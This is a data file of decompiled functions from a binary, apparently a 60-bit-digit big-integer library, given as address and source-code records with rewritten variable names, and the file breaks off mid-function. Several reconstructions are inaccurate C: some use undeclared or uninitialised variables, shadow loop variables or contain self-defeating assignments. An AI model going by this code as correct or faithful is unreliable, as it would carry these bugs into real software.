{"Function Name": "FUN_004066c0", "Address": "004066c0", "Source Code": "int FUN_004066c0(int *input_pointer) \n{\n    ulong *ulong_pointer = *(ulong **)(input_pointer + 4); \n    ulong ulong_value; \n    int integer_value = *input_pointer; \n    if (integer_value != 0) { \n        if (integer_value < 1) { \n            integer_value = 0; \n            ulong_value = *ulong_pointer; \n        } else { \n            ulong_value = *ulong_pointer; \n            if (ulong_value == 0) { \n                int counter = 0; \n                while (ulong_value == 0) { \n                    ulong_pointer++; \n                    counter++; \n                    if (counter == integer_value) { \n                        integer_value = counter * 0x3c; \n                        ulong_value = ulong_pointer[counter]; \n                        goto LAB_00406703; \n                    }\n                    ulong_value = *ulong_pointer; \n                }\n                integer_value = counter * 0x3c; \n            } else { \n                integer_value = 0; \n            }\n        }\n    }\nLAB_00406703: \n    ulong least_significant_bit = ulong_value & 1; \n    while (least_significant_bit == 0) { \n        least_significant_bit = (ulong)((uint)ulong_value & 0xf); \n        integer_value += *(int *)(&DAT_0043ef00 + least_significant_bit * 4); \n        ulong_value >>= 4; \n    }\n    return integer_value; \n}"}
{"Function Name": "FUN_00406820", "Address": "00406820", "Source Code": "ulong FUN_00406820(int *input_pointer) \n{\n    int input_value = *input_pointer; \n    if (input_value != 0) { \n        uint calculated_value = (input_value - 1) * 0x3c; \n        ulong memory_value = *(ulong *)(*(long *)(input_pointer + 4) - 8 + (ulong)input_value * 8); \n        if (memory_value == 0) { \n            return (ulong)calculated_value; \n        }\n        do { \n            calculated_value++; \n            memory_value >>= 1; \n        } while (memory_value != 0); \n        return (ulong)calculated_value; \n    }\n    return (ulong)input_value; \n}"}
{"Function Name": "FUN_00406860", "Address": "00406860", "Source Code": "undefined8 FUN_00406860(int *inputArray1, int *inputArray2)\n{\n    \n    int firstValueInputArray2 = *inputArray2;\n    \n    int firstValueInputArray1 = *inputArray1;\n    \n    long longValueInputArray2Offset4 = *(long *)(inputArray2 + 4);\n    \n    long longValueInputArray1Offset4 = *(long *)(inputArray1 + 4);\n    \n    long offsetFirstValueInputArray1 = (long)firstValueInputArray1 * 8;\n    \n    *inputArray2 = firstValueInputArray1;\n    \n    if (inputArray2[1] < firstValueInputArray1) {\n        \n        undefined8 resultFromFunction = FUN_00405a20(inputArray2, firstValueInputArray1);\n        \n        if ((int)resultFromFunction != 0) {\n            return resultFromFunction;\n        }\n    }\n    \n    if (firstValueInputArray1 > 0) {\n        \n        for (long loopCounter = 0; loopCounter > ~(ulong)(firstValueInputArray1 - 1) * 8; loopCounter -= 8) {\n            \n            ulong ulongValueFromInputArray1 = *(ulong *)(offsetFirstValueInputArray1 - 8 + longValueInputArray1Offset4 + loopCounter);\n            \n            *(ulong *)(longValueInputArray2Offset4 + offsetFirstValueInputArray1 - 8 + loopCounter) = ulongValueFromInputArray1 >> 1 | ((ulong)(ulongValueFromInputArray1 & 1) << 0x3b);\n        }\n    }\n    \n    undefined8 *endPointerInputArray2 = (undefined8 *)(longValueInputArray2Offset4 + offsetFirstValueInputArray1);\n    \n    if (firstValueInputArray1 < firstValueInputArray2) {\n        \n        for (undefined8 *endLoopPointer = endPointerInputArray2 + (ulong)(uint)((firstValueInputArray2 - 1) - firstValueInputArray1) + 1; endPointerInputArray2 != endLoopPointer; endPointerInputArray2++) {\n            \n            *endPointerInputArray2 = 0;\n        }\n    }\n    \n    inputArray2[2] = inputArray1[2];\n    \n    if (firstValueInputArray1 < 1) {\n        \n        if (firstValueInputArray1 == 0) {\n            inputArray2[2] = 0;\n        }\n    } else {\n        \n        long *lastLongPointerInputArray1 = (long *)(longValueInputArray2Offset4 - 0x10 + offsetFirstValueInputArray1);\n        \n        if (*((long *)lastLongPointerInputArray1) == 0) {\n            \n            do {\n                if (--firstValueInputArray1 == 0) {\n                    \n                    *inputArray2 = 0;\n                    inputArray2[2] = 0;\n                    return 0;\n                }\n                \n                longValueInputArray2Offset4 = *lastLongPointerInputArray1--;\n            } while (longValueInputArray2Offset4 == 0);\n            \n            *inputArray2 = firstValueInputArray1;\n        }\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_00406980", "Address": "00406980", "Source Code": "undefined8 FUN_00406980(int *inputArray) \n{\n    long *longPointer; \n    if (1 < *inputArray) { \n        longPointer = (long *)(*(long *)(inputArray + 4) + 8); \n        while (*longPointer == 0xfffffffffffffff) { \n            longPointer++; \n            \n            if (longPointer == (long *)(*(long *)(inputArray + 4) + 0x10 + (ulong)(*inputArray - 2) * 8)) {\n                return 1; \n            }\n        }\n    }\n    \n    return 0; \n}"}
{"Function Name": "FUN_004069d0", "Address": "004069d0", "Source Code": "void FUN_004069d0(long address, long *result_pointer)\n{\n    \n    \n    *result_pointer = 0x1000000000000000 - *(long *)(address + 0x10);\n}"}
{"Function Name": "FUN_004069f0", "Address": "004069f0", "Source Code": "void FUN_004069f0(undefined8 *destination, undefined8 *source)\n{\n    \n    *destination = *source;\n    \n    \n    destination[1] = source[1];\n    \n    \n    destination[2] = source[2];\n    \n    \n    *source = *(undefined8 *)destination;\n}"}
{"Function Name": "FUN_00406a30", "Address": "00406a30", "Source Code": "ulong FUN_00406a30(int *input_pointer)\n{\n    \n    int value = *input_pointer;\n    \n    \n    if (value != 0) {\n        \n        int index = (value < 3) ? value : 2;\n        \n        \n        ulong result = (*(ulong **)(input_pointer + 4))[index - 1];\n        \n        \n        return (index == 2) ? **(ulong **)(input_pointer + 4) & 0xffffffff : result & 0xffffffff;\n    }\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_00406a70", "Address": "00406a70", "Source Code": "ulong FUN_00406a70(int *input_pointer)\n{\n    \n    int dereferenced_value = *input_pointer;\n    \n    \n    if (dereferenced_value == 0) return 0;\n    \n    int index = (dereferenced_value < 3) ? dereferenced_value : 2;\n    \n    \n    ulong result_value = (*(ulong **)(input_pointer + 4))[index - 1];\n    \n    \n    if (index == 2) {\n        result_value = result_value << 0x3c | **(ulong **)(input_pointer + 4);\n    }\n    \n    \n    return result_value;\n}"}
{"Function Name": "FUN_00406aa0", "Address": "00406aa0", "Source Code": "ulong FUN_00406aa0(int *input_array)\n{\n    int first_value = *input_array; \n    if (first_value == 0) return 0; \n    int index = (first_value < 3) ? first_value : 2; \n    ulong result = (*(ulong **)(input_array + 4))[index - 1]; \n    \n    if (index == 2) { \n        result = result << 0x3c | **(ulong **)(input_array + 4); \n    }\n    \n    return result; \n}"}
{"Function Name": "FUN_00406ad0", "Address": "00406ad0", "Source Code": "undefined8 FUN_00406ad0(long address, int threshold)\n{\n    \n    if (threshold <= *(int *)(address + 4)) {\n        \n        return 0;\n    }\n    \n    return processFunction();\n}"}
{"Function Name": "FUN_00406af0", "Address": "00406af0", "Source Code": "undefined8 FUN_00406af0(undefined4 *parameters)\n{\n    \n    void *allocatedMemory = malloc(0x100);\n    \n    \n    *(void **)(parameters + 4) = allocatedMemory;\n    \n    \n    if (allocatedMemory != (void *)0x0) {\n        \n        memset(allocatedMemory, 0, 0x100);\n        \n        \n        *parameters = 0;\n        \n        \n        parameters[1] = 0x20;\n        \n        \n        parameters[2] = 0;\n        \n        \n        return 0;\n    }\n    \n    \n    return 0xfffffffe;\n}"}
{"Function Name": "FUN_00406b50", "Address": "00406b50", "Source Code": "undefined8\nFUN_00406b50(long input_value, undefined8 first_param, undefined8 second_param, undefined8 third_param,\nundefined8 fifth_param, undefined8 sixth_param)\n{\n    long *pointer_var_1; \n    long *pointer_var_2; \n    int function_result; \n    ulong unsigned_long_var; \n    int counter = 0; \n    uint local_counter_1 = 8; \n    long *stack_pointer = (long *)&stack0x00000008; \n    long param_array[4] = {0, first_param, second_param, third_param}; \n    if (input_value != 0) { \n        do {\n            while (true) { \n                function_result = FUN_00406af0(); \n                if (function_result != 0) { \n                    uint local_counter_2 = 8; \n                    pointer_var_2 = (long *)&stack0x00000008; \n                    for (; counter != 0; counter--) { \n                        FUN_004064f0(input_value); \n                        unsigned_long_var = (ulong)local_counter_2; \n                        if (local_counter_2 < 0x30) { \n                            local_counter_2 += 8; \n                            input_value = *(long *)((long)param_array + unsigned_long_var); \n                        } else {\n                            input_value = *pointer_var_2; \n                        }\n                        pointer_var_2++; \n                    }\n                    return 0xfffffffe; \n                }\n                unsigned_long_var = (ulong)local_counter_1; \n                counter++; \n                if (local_counter_1 < 0x30) break; \n                if (*(long *)stack_pointer++ == 0) { \n                    return 0; \n                }\n            }\n            local_counter_1 += 8; \n        } while (*(long *)((long)param_array + unsigned_long_var) != 0); \n    }\n    return 0; \n}"}
{"Function Name": "FUN_00406ce0", "Address": "00406ce0", "Source Code": "undefined8 FUN_00406ce0(undefined4 *array, int size)\n{\n    int allocated_size; \n    void *allocated_memory; \n    undefined8 return_value; \n    long loop_counter; \n    \n    allocated_size = size + 0x40 - ((size >> 0x1f) & 0x1f);\n    \n    allocated_memory = malloc((long)allocated_size << 3);\n    \n    *(void **)(array + 4) = allocated_memory;\n    \n    if (allocated_memory == (void *)0x0) {\n        return_value = 0xfffffffe; \n    } else {\n        loop_counter = 0; \n        *array = 0; \n        array[1] = allocated_size; \n        array[2] = 0; \n        \n        for (; loop_counter < allocated_size; loop_counter++) {\n            *(undefined8 *)((long)allocated_memory + loop_counter * 8) = 0; \n        }\n        return_value = 0; \n    }\n    return return_value; \n}"}
{"Function Name": "FUN_00406f80", "Address": "00406f80", "Source Code": "void FUN_00406f80(undefined8 input_value, undefined4 *output_pointer)\n{\n    \n    if (FUN_00406ce0(input_value, *output_pointer) != 0) {\n        \n        return;\n    }\n    \n    FUN_00406750(output_pointer, input_value);\n}"}
{"Function Name": "FUN_00407140", "Address": "00407140", "Source Code": "undefined8 FUN_00407140(int *param_1, uint param_2)\n{\n    long longValue; \n    undefined8 returnValue; \n    int sumValue; \n    \n    if (0 < (int)param_2) {\n        \n        sumValue = *param_1 + param_2;\n        \n        \n        if (param_1[1] < sumValue) {\n            returnValue = FUN_00405a20(); \n            \n            if ((int)returnValue != 0) {\n                return returnValue;\n            }\n        }\n        \n        \n        longValue = *(long *)(param_1 + 4);\n        *param_1 = sumValue; \n        \n        if ((int)param_2 < sumValue) {\n            \n            undefined8 *sourcePointer = (undefined8 *)(longValue + -8 + ((long)sumValue - (long)(int)param_2) * 8);\n            undefined8 *destinationPointer = (undefined8 *)(longValue + -8 + (long)sumValue * 8);\n            \n            do {\n                destinationPointer[-1] = *sourcePointer; \n                sourcePointer--; \n                destinationPointer--; \n            } while (sourcePointer != (undefined8 *)(longValue + -8 + ((long)sumValue - (long)(int)param_2) * 8 - 1));\n        }\n        \n        for (long index = 0; index < (long)param_2; index++) {\n            *(undefined8 *)(longValue + index * 8) = 0; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_00407370", "Address": "00407370", "Source Code": "undefined8 FUN_00407370(long input_address, ulong *output_pointer)\n{\n    \n    ulong value = **(ulong **)(input_address + 0x10);\n    \n    \n    if ((value & 1) != 0) {\n        \n        long calculated_value = ((int)value * 2 + 4U & 8) + value;\n        \n        \n        calculated_value = (2 - calculated_value * value) * calculated_value;\n        calculated_value = (2 - calculated_value * value) * calculated_value;\n        calculated_value = (2 - calculated_value * value) * calculated_value;\n        \n        \n        *output_pointer = (value * calculated_value - 2) * calculated_value & 0xfffffffffffffff;\n        \n        \n        return 0;\n    }\n    \n    \n    return 0xfffffffd;\n}"}
{"Function Name": "FUN_004074e0", "Address": "004074e0", "Source Code": "undefined8 FUN_004074e0(uint *inputArray, int offset, uint *outputArray)\n{\n    uint tempValue; \n    undefined8 returnValue; \n    ulong tempLongValue; \n    ulong *longPointer; \n    ulong unusedValue; \n    int calculatedValue; \n    ulong *arrayPointer; \n    \n    if ((inputArray != outputArray) && (returnValue = FUN_00406750(inputArray, outputArray), (int)returnValue != 0)) {\n        return returnValue; \n    }\n    \n    \n    calculatedValue = *outputArray + offset / 0x3c;\n    \n    if ((((int)outputArray[1] <= calculatedValue) && ((int)outputArray[1] < calculatedValue + 1)) &&\n        (returnValue = FUN_00405a20(outputArray), (int)returnValue != 0)) {\n        return returnValue; \n    }\n    \n    \n    if ((0x3b < offset) && (returnValue = FUN_00407140(outputArray, offset / 0x3c), (int)returnValue != 0)) {\n        return returnValue; \n    }\n    \n    \n    if (offset % 0x3c == 0) {\n        tempValue = *outputArray; \n        tempLongValue = (ulong)tempValue; \n        \n        if (0 < (int)tempValue) {\n            arrayPointer = *(ulong **)(outputArray + 4); \n            longPointer = arrayPointer + (long)(int)tempLongValue - 2; \n            \n            if (arrayPointer[(long)(int)tempLongValue - 1] != 0) {\n                return 0; \n            }\n            while (true) {\n                tempValue = (int)tempLongValue - 1; \n                tempLongValue = (ulong)tempValue; \n                if (tempValue == 0) break; \n                \n                if (*longPointer-- != 0) {\n                    *outputArray = tempValue; \n                    return 0; \n                }\n            }\n            *outputArray = 0; \n            outputArray[2] = 0; \n            return 0; \n        }\n    } else {\n        byte remainder = (byte)(offset % 0x3c); \n        tempValue = *outputArray; \n        tempLongValue = (ulong)(int)tempValue; \n        arrayPointer = *(ulong **)(outputArray + 4); \n        \n        if (0 < (int)tempValue) {\n            ulong calculatedValue2 = 0; \n            longPointer = arrayPointer; \n            do {\n                ulong *nextElementPointer = longPointer + 1; \n                \n                calculatedValue2 = *longPointer >> (0x3c - remainder & 0x3f) & (1L << (remainder & 0x3f)) - 1U;\n                \n                *longPointer = (*longPointer << (remainder & 0x3f) | calculatedValue2) & 0xfffffffffffffff;\n                longPointer = nextElementPointer; \n            } while (nextElementPointer != arrayPointer + (ulong)(tempValue - 1) + 1); \n            \n            if (calculatedValue2 != 0) {\n                *outputArray = tempValue + 1; \n                arrayPointer[tempLongValue] = calculatedValue2; \n                tempLongValue = (ulong)(tempValue + 1); \n            }\n            longPointer = arrayPointer + (long)(int)tempLongValue - 2; \n        }\n    }\n    \n    if (tempValue != 0) {\n        return 0; \n    }\n    outputArray[2] = 0; \n    return 0; \n}"}
{"Function Name": "FUN_00407b90", "Address": "00407b90", "Source Code": "undefined4 FUN_00407b90(int input_value)\n{\n    long index_counter = 0; \n    int data_value; \n    while (true) { \n        data_value = *(int *)(&DAT_0043edc0 + index_counter); \n        if (data_value == input_value) { \n            return *(undefined4 *)((long)&DAT_0043edc0 + index_counter * 8 + 4); \n        }\n        if (input_value <= data_value) break; \n        index_counter++; \n        if (index_counter == 8) { \n            return 5; \n        }\n    }\n    return (index_counter == 0) ? 0x1c : *(undefined4 *)((long)&DAT_0043edc0 + (index_counter - 1) * 8 + 4); \n}"}
{"Function Name": "FUN_00407be0", "Address": "00407be0", "Source Code": "undefined8 FUN_00407be0(int *inputArray, byte *byteArray, int byteCount)\n{\n    ulong *ulongPointer; \n    int secondElement; \n    long loopCounter; \n    undefined8 functionReturnValue; \n    byte *bytePointer; \n    long fifthElementAddress; \n    secondElement = inputArray[1]; \n    if (secondElement < 2) { \n        functionReturnValue = FUN_00405a20(inputArray, 2); \n        if ((int)functionReturnValue != 0) { \n            return functionReturnValue; \n        }\n        secondElement = inputArray[1]; \n        inputArray[2] = 0; \n        *inputArray = 0; \n    }\n    \n    fifthElementAddress = *(long *)(inputArray + 4); \n    inputArray[2] = 0; \n    *inputArray = 0; \n    for (loopCounter = 0; loopCounter < secondElement; loopCounter++) { \n        *(undefined8 *)(fifthElementAddress + loopCounter * 8) = 0; \n    }\n    bytePointer = byteArray; \n    if (0 < byteCount) { \n        do {\n            functionReturnValue = FUN_004074e0(inputArray, 8, inputArray); \n            if ((int)functionReturnValue != 0) { \n                return functionReturnValue; \n            }\n            ulongPointer = *(ulong **)(inputArray + 4); \n            *ulongPointer |= (ulong)*bytePointer; \n            secondElement = *inputArray + 1; \n            *inputArray = secondElement; \n            bytePointer++; \n        } while (bytePointer != byteArray + byteCount); \n        if (secondElement < 1) { \n            return 0; \n        } else {\n            ulong *lastValidIndex = ulongPointer + (long)secondElement - 2; \n            if (ulongPointer[(long)secondElement - 1] != 0) { \n                return 0; \n            }\n            while (--secondElement != 0) { \n                if (*lastValidIndex != 0) { \n                    *inputArray = secondElement; \n                    return 0; \n                }\n                lastValidIndex--; \n            }\n            *inputArray = 0; \n        }\n    }\n    return 0; \n}"}
{"Function Name": "FUN_00407d20", "Address": "00407d20", "Source Code": "void FUN_00407d20(long input_value, char *string_pointer, int count)\n{\n    \n    if (FUN_00407be0(input_value, string_pointer + 1, count - 1) == 0) {\n        \n        *(uint *)(input_value + 8) = (uint)(*string_pointer != '\\0');\n    }\n}"}
{"Function Name": "FUN_00407d50", "Address": "00407d50", "Source Code": "long FUN_00407d50(int *inputPointer)\n{\n    long longValueFromMemory; \n    ulong unsignedLongValue; \n    int dereferencedValue = *inputPointer; \n    if (dereferencedValue == 0) { \n        return (long)dereferencedValue; \n    }\n    if (1 < dereferencedValue) { \n        longValueFromMemory = *(long *)(inputPointer + 4); \n        int calculatedIndex = (dereferencedValue - 1) * 0x3c; \n        unsignedLongValue = *(ulong *)(longValueFromMemory - 8 + (long)dereferencedValue * 8); \n        if (unsignedLongValue == 0 && calculatedIndex == 0x3c) { \n            return 1; \n        }\n        else {\n            while (unsignedLongValue != 0) { \n                unsignedLongValue >>= 1; \n                calculatedIndex++; \n            }\n        }\n        if ((*(byte *)(longValueFromMemory + 8) & 1) == 0) { \n            return 0; \n        }\n        for (int loopIndex = 0x3c, dereferencedValue = 1; loopIndex != calculatedIndex; loopIndex++) { \n            ulong unsignedLongValue = 2; \n            while (true) { \n                if ((*(ulong *)(longValueFromMemory + (long)dereferencedValue * 8) & unsignedLongValue) == 0) { \n                    return 0; \n                }\n                unsignedLongValue *= 2; \n                if (unsignedLongValue < 0x1000000000000000) break; \n                dereferencedValue++; \n                if (loopIndex == calculatedIndex) { \n                    return 1; \n                }\n            }\n        }\n    }\n    return 1; \n}"}
{"Function Name": "FUN_00407df0", "Address": "00407df0", "Source Code": "uint FUN_00407df0(uint *input_pointer)\n{\n    \n    uint input_value = *input_pointer;\n    \n    if ((input_value != 0) && (input_value != 1)) {\n        \n        if (1 < (int)input_value) {\n            long loop_counter = 0; \n            int match_count = 0;  \n            \n            do {\n                \n                match_count += (*(long *)(*(long *)(input_pointer + 4) + loop_counter * 8) == 0xfffffffffffffff);\n                loop_counter++; \n            } while ((int)loop_counter < (int)input_value); \n            \n            return (uint)((int)input_value >> 1 <= match_count);\n        }\n    }\n    \n    return 0;\n}"}
{"Function Name": "FUN_00408170", "Address": "00408170", "Source Code": "undefined8 FUN_00408170(uint *param_1, ulong param_2, undefined8 *param_3, ulong *param_4)\n{\n    undefined8 returnValue; \n    ulong intermediateValue1; \n    ulong intermediateValue2; \n    int loopIndex; \n    ulong bitManipulationValue; \n    ulong resultValue; \n    uint param1Value; \n    uint adjustedValue; \n    long pointerArithmeticTemp1; \n    long pointerArithmeticTemp2; \n    long loopCalculationTemp; \n    bool comparisonFlag; \n    uint localValue1; \n    undefined8 localValue2; \n    undefined8 localValue3; \n    long localPointer; \n    \n    if (param_2 == 0) {\n        return 0xfffffffd; \n    }\n    \n    if ((param_2 == 1) || (*param_1 == 0)) {\n        \n        if (param_4 != (ulong *)0x0) {\n            *param_4 = 0;\n        }\n        \n        if (param_3 == (undefined8 *)0x0) {\n            return 0;\n        }\n        \n        return FUN_00406750(param_1, param_3);\n    }\n    \n    if ((param_2 - 1 & param_2) == 0) {\n        \n        for (loopIndex = 0; loopIndex < 0x3c; loopIndex++) {\n            \n            if (param_2 == 1L << ((byte)loopIndex & 0x3f)) {\n                \n                if (param_4 != (ulong *)0x0) {\n                    *param_4 = param_2 - 1 & **(ulong **)(param_1 + 4);\n                }\n                \n                if (param_3 != (undefined8 *)0x0) {\n                    return FUN_00407f00(param_1, loopIndex, param_3, 0);\n                }\n                return 0; \n            }\n        }\n    }\n    \n    if (param_2 == 3) {\n        return FUN_00406d50(param_1, param_3, param_4); \n    }\n    \n    returnValue = FUN_00406ce0(&localValue2);\n    if ((int)returnValue != 0) {\n        return returnValue; \n    }\n    param1Value = *param_1; \n    localValue1 = param_1[2]; \n    localValue2 = CONCAT44(localValue2._4_4_, param1Value); \n    adjustedValue = param1Value - 1; \n    localValue3 = CONCAT44(localValue3._4_4_, localValue1); \n    \n    if ((int)adjustedValue < 0) {\n        resultValue = 0; \n    } else {\n        pointerArithmeticTemp1 = *(long *)(param_1 + 4); \n        pointerArithmeticTemp2 = (long)(int)adjustedValue * 8 + localPointer; \n        loopCalculationTemp = 0; \n        bitManipulationValue = 0; \n        do {\n            \n            resultValue = bitManipulationValue << 0x3c | *(ulong *)((long)(int)adjustedValue * 8 + pointerArithmeticTemp1 + loopCalculationTemp);\n            bitManipulationValue = resultValue >> 4; \n            \n            if (bitManipulationValue == 0) {\n                intermediateValue1 = 0; \n                if (param_2 <= resultValue) goto LAB_00408349; \n            } else {\n            LAB_00408349:\n                \n                intermediateValue1 = FUN_00435560(resultValue, bitManipulationValue, param_2, 0);\n                intermediateValue2 = SUB168(CONCAT44(0, intermediateValue1) * CONCAT44(0, param_2), 0); \n                comparisonFlag = resultValue < intermediateValue2; \n                resultValue -= intermediateValue2; \n                loopCalculationTemp = (bitManipulationValue - SUB168(CONCAT44(0, intermediateValue1) * CONCAT44(0, param_2), 8)) - (ulong)comparisonFlag; \n            }\n            *(ulong *)(pointerArithmeticTemp2 + loopCalculationTemp) = intermediateValue1; \n            loopCalculationTemp -= 8; \n        } while (loopCalculationTemp != ~(ulong)adjustedValue << 3); \n    }\n    \n    if (param_4 != (ulong *)0x0) {\n        *param_4 = resultValue;\n    }\n    \n    if (param_3 == (undefined8 *)0x0) goto LAB_0040826c;\n    \n    if ((int)param1Value < 1) {\n        \n        if (param1Value == 0) goto LAB_00408230;\n    } else if (*(long *)(localPointer + -8 + (long)(int)param1Value * 8) == 0) {\n        long *plVar7 = (long *)(localPointer + -0x10 + (long)(int)param1Value * 8); \n        \n        for (; adjustedValue != 0; adjustedValue--) {\n            param1Value = adjustedValue; \n            if (*plVar7 != 0) goto LAB_0040823b; \n            plVar7--; \n        }\n    LAB_00408230:\n        localValue1 = 0; \n        param1Value = 0; \n    }\nLAB_0040823b:\n    returnValue = *param_3; \n    *(uint *)param_3 = param1Value; \n    localValue3 = param_3[1]; \n    *(int *)((long)param_3 + 4) = localValue2._4_4_; \n    param_3[2] = localPointer; \n    localValue2 = returnValue; \n    localPointer = param_3[2]; \nLAB_0040826c:\n    FUN_004064f0(&localValue2); \n    return 0; \n}"}
{"Function Name": "FUN_00408420", "Address": "00408420", "Source Code": "void FUN_00408420(undefined8 input1, undefined8 input2, undefined8 input3)\n{\n    \n    FUN_00408170(input1, input2, 0, input3);\n}"}
{"Function Name": "FUN_00408430", "Address": "00408430", "Source Code": "void FUN_00408430(undefined8 param_1, undefined4 *outputParam)\n{\n    int returnValue; \n    undefined8 *dataPointer = &DAT_0043e5c0; \n    *outputParam = 0; \n    while (true) {\n        returnValue = FUN_00408170(param_1, *dataPointer, 0, &localValue); \n        if (returnValue != 0) { \n            return; \n        }\n        if (localValue == 0) { \n            break; \n        }\n        dataPointer++; \n        if (dataPointer == &DAT_0043edc0) { \n            return; \n        }\n    }\n    *outputParam = 1; \n    return; \n}"}
{"Function Name": "FUN_004084a0", "Address": "004084a0", "Source Code": "ulong FUN_004084a0(int *inputArray, int inputValue, int *outputValue)\n{\n    int firstInteger; \n    uint returnValue; \n    ulong finalReturnValue; \n    int calculatedValue; \n    uint countBasedOnParam1; \n    int temporaryValues[2]; \n    *outputValue = 0; \n    \n    if (inputValue - 2U < 0x3f) {\n        firstInteger = *inputArray; \n        if (firstInteger == 0) { \n            *outputValue = 2; \n            return (long)firstInteger; \n        }\n        if (inputValue == 2) { \n            calculatedValue = (firstInteger - 1) * 0x3c; \n            \n            for (finalReturnValue = *(ulong *)(*(long *)(inputArray + 4) + -8 + (long)firstInteger * 8); finalReturnValue != 0; finalReturnValue = finalReturnValue >> 1) {\n                calculatedValue++; \n            }\n            *outputValue = calculatedValue + 1 + (uint)(inputArray[2] == 1); \n            return 0; \n        }\n        finalReturnValue = FUN_00406f80(temporaryValues, inputArray); \n        if ((int)finalReturnValue == 0) { \n            countBasedOnParam1 = (uint)(inputArray[2] == 1); \n            while (true) { \n                if (temporaryValues[0] == 0) { \n                    FUN_004064f0(temporaryValues); \n                    *outputValue = countBasedOnParam1 + 1; \n                    return 0; \n                }\n                returnValue = FUN_00408170(temporaryValues, (long)inputValue, temporaryValues, NULL); \n                if (returnValue != 0) break; \n                countBasedOnParam1++; \n            }\n            FUN_004064f0(temporaryValues); \n            finalReturnValue = (ulong)returnValue; \n        }\n    } else {\n        finalReturnValue = 0xfffffffd; \n    }\n    return finalReturnValue; \n}"}
{"Function Name": "FUN_00408840", "Address": "00408840", "Source Code": "void FUN_00408840(uint *inputArray, ulong inputValue)\n{\n    \n    uint secondElement = inputArray[1];\n    \n    \n    ulong *ulongArray = *(ulong **)(inputArray + 4);\n    \n    \n    inputArray[2] = 0;\n    \n    \n    *inputArray = 0;\n    \n    if (secondElement > 0) {\n        \n        for (long index = 0; index < (long)secondElement; index++) {\n            ulongArray[index] = 0;\n        }\n    }\n    \n    \n    *ulongArray = inputValue & 0xfffffffffffffff;\n    \n    \n    *inputArray = (uint)((inputValue & 0xfffffffffffffff) != 0);\n}"}
{"Function Name": "FUN_00408b40", "Address": "00408b40", "Source Code": "undefined8 FUN_00408b40(int *input_array)\n{\n    \n    int max_size = *input_array < 1 ? 1 : *input_array;\n    undefined8 return_value = 0; \n    \n    if (input_array[1] != max_size) {\n        \n        void *new_memory = realloc(*(void **)(input_array + 4), (long)max_size << 3);\n        \n        if (new_memory == (void *)0x0) {\n            return_value = 0xfffffffe; \n        } else {\n            \n            *(void **)(input_array + 4) = new_memory;\n            \n            input_array[1] = max_size;\n        }\n    }\n    \n    return return_value;\n}"}
{"Function Name": "FUN_00409390", "Address": "00409390", "Source Code": "ulong FUN_00409390(undefined8 inputParam, undefined *dataPointer)\n{\n    uint returnValue; \n    ulong resultValue; \n    long processedCount = 0; \n    int tempData[4]; \n    \n    resultValue = FUN_00406f80(tempData, inputParam);\n    \n    \n    if ((int)resultValue == 0) {\n        do {\n            \n            if (tempData[0] == 0) {\n                int swapIndex = (int)processedCount - 1; \n                \n                if (swapIndex > 0) {\n                    int swapCount = 0; \n                    undefined *swapPointer = dataPointer + swapIndex; \n                    do {\n                        undefined currentValue = *dataPointer; \n                        swapCount++; \n                        swapIndex--; \n                        *dataPointer = *swapPointer; \n                        *swapPointer = currentValue; \n                        swapPointer--; \n                        dataPointer++; \n                    } while (swapCount < swapIndex); \n                }\n                break; \n            }\n            \n            dataPointer[processedCount] = (char)tempData[0];\n            processedCount++; \n            \n            returnValue = FUN_00407f00(tempData, 8, tempData, 0);\n        } while (returnValue == 0); \n        \n        FUN_004064f0(tempData);\n        resultValue = (ulong)returnValue; \n    }\n    return resultValue; \n}"}
{"Function Name": "FUN_00409440", "Address": "00409440", "Source Code": "void FUN_00409440(long input_value_1,long input_value_2)\n{\n    \n    if (FUN_00409390(input_value_1,input_value_2 + 1) == 0) {\n        \n        *(bool *)input_value_2 = *(int *)(input_value_1 + 8) != 0; \n    }\n}"}
{"Function Name": "FUN_00409470", "Address": "00409470", "Source Code": "ulong FUN_00409470(uint *param_1, undefined *param_2, int param_3)\n{\n    uint returnValue; \n    int loopCounter; \n    ulong result; \n    undefined *currentPos; \n    undefined *initialPos; \n    int processedCount; \n    long tempStorage; \n    int intermediateValues[2]; \n    int state; \n    \n    if (0x3e < param_3 - 2U) {\n        return 0xfffffffd; \n    }\n    \n    result = (ulong)*param_1; \n    if (*param_1 == 0) { \n        *param_2 = 0x30; \n        param_2[1] = 0; \n    } else {\n        result = FUN_00406f80(intermediateValues, param_1); \n        if ((int)result == 0) { \n            if (state == 1) { \n                *param_2 = 0x2d; \n                state = 0; \n                param_2++; \n            }\n            initialPos = param_2; \n            if (intermediateValues[0] != 0) { \n                currentPos = param_2; \n                do {\n                    returnValue = FUN_00408170(intermediateValues, (long)param_3, intermediateValues, &tempStorage); \n                    if (returnValue != 0) { \n                        FUN_004064f0(intermediateValues); \n                        return (ulong)returnValue; \n                    }\n                    *currentPos = PTR_s_0123456789ABCDEFGHIJKLMNOPQRSTUV_00649590[tempStorage]; \n                    currentPos++; \n                } while (intermediateValues[0] != 0); \n                \n                processedCount = (int)currentPos - (int)param_2; \n                if (0 < processedCount) { \n                    loopCounter = 0; \n                    currentPos = param_2 + processedCount; \n                    do {\n                        *param_2 = *currentPos; \n                        *currentPos = *(param_2 + loopCounter); \n                        currentPos--; \n                        param_2++; \n                        loopCounter++; \n                    } while (loopCounter < processedCount - loopCounter); \n                }\n            }\n        }\n        *initialPos = 0; \n        FUN_004064f0(intermediateValues); \n        return 0; \n    }\n    return result; \n}"}
{"Function Name": "FUN_004096a0", "Address": "004096a0", "Source Code": "ulong FUN_004096a0(int *input_pointer)\n{\n    \n    int input_value = *input_pointer;\n    \n    \n    ulong result_value = (ulong)input_value;\n    \n    \n    if (input_value != 0) {\n        \n        uint calculated_value = (input_value - 1) * 0x3c;\n        \n        \n        result_value = *(ulong *)(*(long *)(input_pointer + 4) - 8 + result_value * 8);\n        \n        \n        if (result_value == 0) {\n            \n            uint aligned_value = (calculated_value + 7) & ~7;\n            \n            \n            if (calculated_value < 4) {\n                aligned_value = calculated_value;\n            }\n            \n            return (ulong)(((int)aligned_value >> 3) + (uint)((calculated_value & 4) != 0));\n        }\n        \n        \n        uint aligned_value = calculated_value;\n        \n        \n        while (result_value != 0) {\n            aligned_value++;\n            result_value >>= 1; \n        }\n        \n        \n        aligned_value += 8;\n        \n        \n        if (calculated_value < 4) {\n            aligned_value = calculated_value;\n        }\n        \n        \n        result_value = (ulong)(((int)aligned_value >> 3) + (uint)((calculated_value & 7) != 0));\n    }\n    \n    \n    return 